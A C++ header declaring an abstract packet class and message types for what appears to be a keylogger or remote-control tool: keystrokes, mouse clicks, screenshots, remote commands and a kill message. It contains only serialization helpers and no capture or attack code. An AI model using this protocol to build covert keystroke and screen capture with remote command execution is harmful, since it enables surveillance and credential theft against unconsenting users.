#ifndef _APACKET_HPP_
# define _APACKET_HPP_

# include <string>
# include <vector>

# include "PacketException.hpp"

# define JSONPAIR "\"type\": "
# define JSONPAIRSIZE std::string("\"type\": ").size()

# define DONE 1

enum PacketType
{
    HANDSHAKE = 0,
    KEYSTROKES = 1,
    MOUSECLICK = 2,
    COMMANDRESPONSE = 3,
    SCREENSHOTRESPONSE = 4,
    KILLRESPONSE = 5,
    COMMAND = 10,
    SHORTRESPONSE = 11,
    SCREENSHOT = 12,
    KILL = 13,
};

class APacket
{
public:
    APacket(PacketType type);
    virtual ~APacket();
    
    virtual std::vector<char> to_bytes() const = 0;
    virtual std::string to_readable() const = 0;
    virtual void from_bytes(const std::vector<char> &bytes) = 0;
    virtual void from_readable(const std::string &data) = 0;

protected:
    std::vector<char> to_byte_body() const;
    std::string to_readable_body() const;
    void from_byte_body(const std::vector<char> &bytes);
    void from_readable_body(const std::string &data);

    template <typename T>
    void fill_bytes(std::vector<char> &bytes, T nb) const
    {
        auto it = bytes.end();

        for (std::size_t i = 0;i < sizeof(T);++i)
        {
            it = bytes.insert(it, (nb & 0xFF));
            nb = nb >> 8;
        }
    }

    
    template <typename T>
    void get_bytes(const std::vector<char> &bytes, std::size_t &pos, T &nb) const
    {
        std::size_t i = 0;
        
        for (;i < sizeof(T) && pos + i != bytes.size();++i)
            nb = ((nb << 8) | bytes[pos + i]);
        pos += i;
        if (pos < sizeof(T) + 1)
            throw PacketException("Error while parse packet");
    }

    
    char    _type;
};

#endif